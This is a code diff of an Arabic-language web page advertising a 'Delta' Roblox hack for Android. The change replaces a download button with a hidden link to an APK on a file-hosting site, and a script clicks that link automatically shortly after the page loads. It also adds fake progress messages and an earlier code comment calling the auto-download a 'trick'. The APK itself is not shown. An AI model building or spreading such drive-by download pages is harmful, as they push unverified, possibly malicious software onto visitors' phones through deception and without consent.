@@ -3,118 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تحديث دلتا - الإصدار الأخير</title>
+    <title>Delta Hub - التحميل التلقائي</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        :root { --primary: #00d2ff; --accent: #007bff; --bg: #0a0a0a; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
         
         body {
-            background: radial-gradient(circle at center, #1a1a2e 0%, #0f0f1a 100%);
+            background: radial-gradient(circle at center, #111 0%, #000 100%);
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
             color: white;
+            overflow: hidden;
         }
 
-        .main-card {
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+        .main-container {
             text-align: center;
+            width: 100%;
             padding: 20px;
         }
 
-        .logo-container {
-            position: relative;
-            margin-bottom: 30px;
-        }
-
-        .logo {
+        .loader-circle {
             width: 120px;
             height: 120px;
-            border-radius: 30px;
-            box-shadow: 0 0 50px rgba(0, 123, 255, 0.5);
-            border: 2px solid #007bff;
-            animation: pulse 2s infinite;
+            border: 5px solid rgba(255,255,255,0.1);
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            animation: spin 1s linear infinite;
+            box-shadow: 0 0 20px rgba(0, 210, 255, 0.2);
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 20px rgba(0, 123, 255, 0.4); }
-            50% { transform: scale(1.05); box-shadow: 0 0 40px rgba(0, 123, 255, 0.7); }
-            100% { transform: scale(1); box-shadow: 0 0 20px rgba(0, 123, 255, 0.4); }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        h1 { font-size: 28px; margin-bottom: 10px; letter-spacing: 1px; color: #fff; }
-        .version { background: #007bff; padding: 5px 15px; border-radius: 50px; font-size: 14px; margin-bottom: 20px; display: inline-block; }
-        
-        .info-box {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
+        h1 { font-size: 28px; margin-bottom: 10px; text-shadow: 0 0 10px rgba(255,255,255,0.3); }
+        p { color: #888; font-size: 16px; margin-bottom: 40px; }
+
+        .status-box {
+            background: rgba(255,255,255,0.05);
+            padding: 15px;
             border-radius: 15px;
-            margin-bottom: 30px;
-            width: 90%;
-            max-width: 350px;
+            border: 1px solid rgba(255,255,255,0.1);
+            display: inline-block;
+            min-width: 250px;
         }
 
-        .info-item { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; color: #ccc; }
-        .info-item span:last-child { color: #007bff; font-weight: bold; }
+        .status-text { color: var(--primary); font-weight: bold; }
 
-        .download-btn {
-            width: 90%;
-            max-width: 300px;
-            background: linear-gradient(45deg, #007bff, #00c6ff);
-            color: white;
-            padding: 18px;
-            text-decoration: none;
-            border-radius: 15px;
-            font-size: 20px;
-            font-weight: bold;
-            box-shadow: 0 10px 20px rgba(0, 123, 255, 0.3);
-            transition: 0.3s;
+        /* زر احتياطي في حال لم يبدأ التحميل تلقائياً */
+        .manual-btn {
+            margin-top: 30px;
+            display: block;
+            color: #555;
+            text-decoration: underline;
+            font-size: 13px;
+            background: none;
             border: none;
             cursor: pointer;
         }
-
-        .download-btn:active { transform: scale(0.95); }
-
-        footer { position: absolute; bottom: 20px; color: #555; font-size: 12px; }
     </style>
 </head>
 <body>
 
-<div class="main-card">
-    <div class="logo-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon.svg" class="logo" alt="Delta Logo">
+<div class="main-container">
+    <div class="loader-circle"></div>
+    <h1>جاري تجهيز ملف التثبيت</h1>
+    <p>يرجى عدم إغلاق الصفحة، سيبدأ التحميل الآن...</p>
+
+    <div class="status-box">
+        <span class="status-text" id="status">جاري الاتصال بالسيرفر...</span>
     </div>
 
-    <h1>هاك دلتا - DELTA</h1>
-    <div class="version">إصدار V2.647 الأخير</div>
-
-    <div class="info-box">
-        <div class="info-item"><span>الحالة:</span><span>يعمل بنجاح ✅</span></div>
-        <div class="info-item"><span>الحجم:</span><span>118.63 MB</span></div>
-        <div class="info-item"><span>التوافق:</span><span>Android 8+</span></div>
-    </div>
-
-    <a href="https://www.mediafire.com/file/iq1uyr0g7q8qo2v/base.apk/file" id="downloadLink" class="download-btn">تثبيت الآن</a>
-
-    <footer>جميع الحقوق محفوظة © 2026</footer>
+    <a href="https://files.catbox.moe/28ne2w.apk" id="downloadLink" style="display:none;"></a>
+    
+    <button class="manual-btn" onclick="startDownload()">إذا لم يبدأ التحميل تلقائياً اضغط هنا</button>
 </div>
 
 <script>
-    // خدعة لبدء التحميل تلقائياً بعد ثانيتين من دخول الصفحة
+    function startDownload() {
+        const link = document.getElementById('downloadLink');
+        link.click();
+        document.getElementById('status').innerText = "بدأ التحميل بنجاح ✅";
+        document.getElementById('status').style.color = "#00ff88";
+    }
+
+    // بدء التحميل تلقائياً بعد ثانية واحدة من فتح الصفحة
     window.onload = function() {
-        setTimeout(function() {
-            // تفعيل الرابط تلقائياً
-            // window.location.href = document.getElementById('downloadLink').href;
-        }, 2000);
+        setTimeout(startDownload, 1500);
     };
 </script>
 
